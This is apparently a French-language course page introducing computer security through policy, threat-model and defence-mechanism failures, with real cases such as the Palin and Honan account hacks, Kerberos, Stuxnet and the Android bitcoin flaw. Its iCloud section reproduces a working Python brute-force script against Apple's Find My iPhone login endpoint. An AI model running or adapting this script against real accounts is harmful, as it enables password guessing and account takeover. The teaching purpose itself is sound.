---
title: Introduction 
nav: true
---

# Qu'est ce que la sécurité? 

En une phrase: atteindre un certain but en présence d'adversaires.
Très souvent les systèmes sont connectés à Internet, qui cache des adversaires. Ainsi, le *design* ou architecture de ces systèmes doit prendre en compte la présence de ces acteurs malveillants, i.e en d'autres termes est ce que le système peut effectuer correctement sa tâche en présence d'adversaires?


# Plan général:
Penser la sécurité est un exercice extrêmement difficile en raison de la complexité du sujet. C'est pour cela qu'on va tenter une approche par segment, en déconstruisant le problème en 3 sous-problèmes.

- **La stratégie**: Le but que l'on se fixe. (i.e Raymond Deubaze doit pouvoir lire le fichier F mais ne peut pas le modifier).
- **Le modèle de menace**: Les hypothèses formulées à propos de l'attaquant. (i.e L'attaquant peut deviner les mot de passe, n'a pas accès physiquement au serveur...) Il est plus agile et conseillé d'assumer le pire en terme des choses que peut faire l'attaquant.
- **Le mécanisme de défense**: Les différentes poignées su système qui permettre de garantir le bon fonctionnement de la stratégie (i.e les comptes utilisateurs, les mots de passe, les permissions et privilèges des fichiers, les cryptages de données... ).

L'objectif final donc est de garantir la *stratégie* sachant le *modèle de menace* via le *mécanisme de défense*. 

Nous verrons qu'il suffit d'une faille dans une seule de ces sous-catégories, peut provoquer l'effondrement de tout le système même si les deux autres sous-catégories sont parfaitement conçues!

Il est difficile de penser à tous les moyens possibles pour contourner la sécurité, car c'est un problème ouvert à une infinité d'éventualités. Chaque maillon de la chaîne importe, et les plus faibles encore plus.

C'est pourquoi on ne peut s'intéresser à la sécurité en dernière étape, une fois qu'on a fini de développer notre système, mais qu'il faut s'y prendre de manière itérative tout au long du développement: Conception du système, mise à jour du modèle de menace au dur et à mesure...

Rien de mieux pour faire le tour de ces sous-concepts en prenant des exemples de la vie réelle:

# Failles au niveau de la stratégie:

 
- [Compte email de Sarah Palin](https://en.wikipedia.org/wiki/Sarah_Palin_email_hack)
    - Les comptes Yahoo ont un username, un mot de passe et des questions de sécurité. L'utilisateur peut se connecter en fournissant son username ainsi que son mot de passe.
    - Si le mot de passe est oublié, il peut être réinitialisé grâce aux questions de sécurité. Un des inconvénients de cette méthode est que les questions de sécurité sont plus faciles à deviner que les mots de passe en général.
    - Un jeune adolescent voulant nuire à la réputation de Sarah Palin a deviné les réponses secrètes de cette dernière en quelques minutes en se reportant à sa page Wikipédia.
    - Cette faille a montré un désavantage à l'utilisation des questions dans la **stratégie du système**. Celles ci rendent dans certains cas obsolètes la notion de mot de passe qui est alors facilement contourné.




- [Comptes Amazon, Apple, Google, etc. de Mat Honan](https://www.wired.com/gadgetlab/2012/08/apple-amazon-mat-honan-hacking/all/)

    - Pour régénérer le mot de passe, **Gmail** vous envoie un mail de vérification à une autre adresse mail de backup. Par soucis d'aider l'utilisateur à s'en souvenir, Gmail dévoile une partie de l'adresse mail à laquelle il a envoyé le lien de réinitialisation. Dans le cas de Mat Honan, l'adresse de backup était son adresse Apple *...@me.com*. 
    - Pour réinitialiser le mot de passe, le compte Apple vous demande votre adresse ainsi que les 4 derniers chiffre de votre carte de crédit enregistrée chez eux. 
    - Dans le cas d'Amazon, (en tout cas à l'époque) n'importe qui avait le droit d'acheter avec un compte sans avoir à s'authentifier du moment qu'il enregistre une nouvelle carte de crédit et qu'il achète avec cette même carte de crédit. Tout ce que l'attaquant a fait c'est d'ajouter une carte de crédit, ensuite il a réinitialisé le *mdp* Amazon qui lui aussi ne demandait que les 4 derniers chiffres de la carte de crédit pour cela. L'attaquant a donc utilisé sa propre carte pour réinitialisé le *mdp*, puis une fois à l'intérieur du compte il a obtenu les 4 derniers chiffres de la carte du vrai propriétaire du compte (Mat Honan), et c'est ainsi qu'il a pu entrer dans son compte Apple puis Gmail.



### Comment résoudre les problèmes à ce stade:

Il faut vraiment penser aux conséquences et aller jusqu'au bout du raisonnement concernant la stratégie. Le plus compliqué c'est de considérer les failles dans les systèmes distribués, où on ne contrôle pas ce que chacun fait.

# Failles au niveau du modèle de menace:
Le problème avec le modèle de menace (i.e l'ensemble des suppositions faites lors de la conception) est que les hypothèses formulées sont généralement liées à un certain contexte prédéfini, comme on va l'observer dans les cas suivants. Cependant même si ces suppositions s'avèrent perspicaces au moment où elles sont faites, le contexte lui même risque d'évoluer et risque de mettre à mal le modèle par la suite:

- Facteur humain
    - Souvent le facteur humain est écarté (à tort) des éventuelles menaces. Mais c'est une erreur classique: Il suffit qu'un utilisateur pas très concentré clique sur un lien d'un email (Phishing) frauduleux, pour qu'il installe à son insu le malware sur son système. Ce qui est encore plus grave si celui ci dispose de droits privilégiés. Un autre exemple classique est que l'employé d'une entreprise reçoive un appel très persuasif de la part d'un prétendu chef pour qu'il fasse fuiter des informations comprométentes.

- Kerberos
    - L'exemple de Kerberos illustre parfaitement le fait que les suppositions du modèle de menace sont profondémenet ancrées dans un contexte particulier.
    Kerberos est un protocole d'authentification crée par le MIT au milieu des années 80, qui se basait sur une clé 56-bit DES. À l'époque vérifier les 2^56 possibilités semblait impossible.
    Aujourd'hui ça ne doit pas couter plus que 80€ (https://www.cloudcracker.com/dictionaries.html).

- Exemple de faille de hardware
    - Si vous faites confiance à votre Hardware, vous avez interêt à ce le votre adversaire ne soit pas [la NSA](https://www.schneier.com/blog/archives/2013/12/more_about_the.html). 

- Hors d'Internet, hors de danger ?
    - C'est ce que semblait croire [les autorités iraniennes à l'époque de Stuxnet](https://fr.wikipedia.org/wiki/Stuxnet). Pourtant leur système était à priori non atteignable par réseau Internet. **Cette hypothèse pourtant à l'air de mettre en sécurité tout le réseau interne d'adversaire externe**. 
    Et pourtant, le virus Stuxnet s'est propagé spécialement en Iran, par Internet et restait parfaitement inactif tant que le système sur lequel il se trouvait n'était pas celui des réacteurs nucléaires. Et à force de se propager il a fini par atterir sur des clés USB d'employés de la station nucléaire iranienne.

### Comment résoudre les problèmes à ce stade:
Il faut expliciter le plus possible les modèles de menace afin de voir plus facilement les possibles failles.


# Failles au niveau du mécanisme de défense:

Contrairement aux deux parties précédentes, cette partie n'est liée à aucun contexte en particulier. Il s'agit dans la grande majorité des cas de Bugs software! C'est pourquoi c'est aussi la partie la plus technique.

- [Cas d'iCloud d'Apple](https://github.com/hackappcom/ibrute):
    - Très souvent les gens choisissent des mots de passe *faibles* et ont droit à plusieurs tentatives de login dans le cas où ils ne s'en souviennent pas. 
    La plupart des services fournis par iCloud d'Apple contenaient cette fonction qui limite le nombre d'essais. Le seul problème est qu'il y'avait un seul service ("find my iPhone") qui ne comptait pas le nombre de tentatives. L'adversaire pouvait en un petit script faire autant de tentatives qu'il lui plaisait, aussi rapidement que le transferts de paquet via Internet (porbablement plusieurs millions de tentatives par jour). Un [tel script](https://github.com/hackappcom/ibrute) n'est pas du tout compliqué à mettre en place comme on peut le voir ici dans le cas de Python: 
    ```
        import json
        import urllib2
        import plistlib
        from xml.dom.minidom import *
        from lxml import etree
        import unicodedata
        import re
        import xml.etree.ElementTree
        import time
        import random
        import json
        import cookielib
        import urllib
        import time
        import socket
        import base64
        from time import strftime


        import socket

        def TryPass(apple_id,password):


            url = 'https://fmipmobile.icloud.com/fmipservice/device/'+apple_id+'/initClient'

            headers = {
                'User-Agent': 'FindMyiPhone/376 CFNetwork/672.0.8 Darwin/14.0.0',
                }

            json = {
            "clientContext": {
            "appName": "FindMyiPhone",
            "osVersion": "7.0.4",
            "clientTimestamp": 429746389281,
            "appVersion": "3.0",
            #make it random!
            "deviceUDID": "0123456789485ef5b1e6c4f356453be033d15622",
            "inactiveTime": 1,
            "buildVersion": "376",
            "productType": "iPhone6,1"
            },
            "serverContext": {}
            }

            req_plist=plistlib.writePlistToString(json)

            req = urllib2.Request(url, req_plist, headers=headers)
            base64string = base64.encodestring('%s:%s' % (apple_id, password)).replace('\n', '')
            req.add_header("Authorization", "Basic %s" % base64string)



            try:
                resp = urllib2.urlopen(req)
            except urllib2.HTTPError, err:
                if err.code == 401:
                    return False
                if err.code == 330:
                    return True

            return 'bad'
        ```
        Il suffit maintenant de lire un fichier contenant les emails cibles ainsi que le fichier contenant tous les mots de passes faibles et en faisant une double boucle sur ces deux listes, le tour est joué:
        ```
        with open('passlist.txt', 'r') as file:
            passwords = file.read()


        with open('mails.txt', 'r') as file:
            apple_ids = file.read()



        for apple_id in apple_ids.split('\n'):
            if apple_id:
                print 'Working with:',apple_id
                for pwd in passwords.split('\n'):
                    if pwd:
                        #print pwd
                        password = pwd.split(' ')[1]
                        print 'Trying: ', apple_id,password
                        
                        try:
                            result = TryPass(apple_id,password)
                            if result == True:
                                print 'Got It!: ', apple_id,password
                            if result == 'bad':
                                print 'We are blocked!: ',apple_id,password
                        except:
                            print 'Protocol failed ',pwd

        ```


- [Bitcoin via Android](https://bitcoin.org/en/alert/2013-08-11-android)
    - Le bitcoin d'un compte peut être dépensé par quiconque connaît la clé privée de ce compte. Or en 2013 plusieurs applications Android ui gèrent les portefeuilles bitcoin utilisaient [l'API Java: SecureRandom](https://docs.oracle.com/javase/8/docs/api/java/security/SecureRandom.html). Or il se trouvait que ce système utilise un générateur de nombre aléatoire comme le décrit la doc *"Many SecureRandom implementations are in the form of a pseudo-random number generator (PRNG), which means they use a deterministic algorithm to produce a pseudo-random sequence from a true random seed."*.
    ```
    SecureRandom random = new SecureRandom();
    byte bytes[] = new byte[20];
    random.nextBytes(bytes);
    ```
    Et on genère le *Seed* de la manière suivante:
    ```
    byte seed[] = random.generateSeed(20);
    ```
     Mais ce que peu de gens ont vu, c'est que le code comportait un petit bug, et que dans certains cas particuliers, le système oubliait de donner de *seed* à PRNG. En conséquence beaucoup de clés privées ont été très faciles à deviner par les attaquants qui ont dépensé tous les bitcoins qui leur passaient par les mains. 
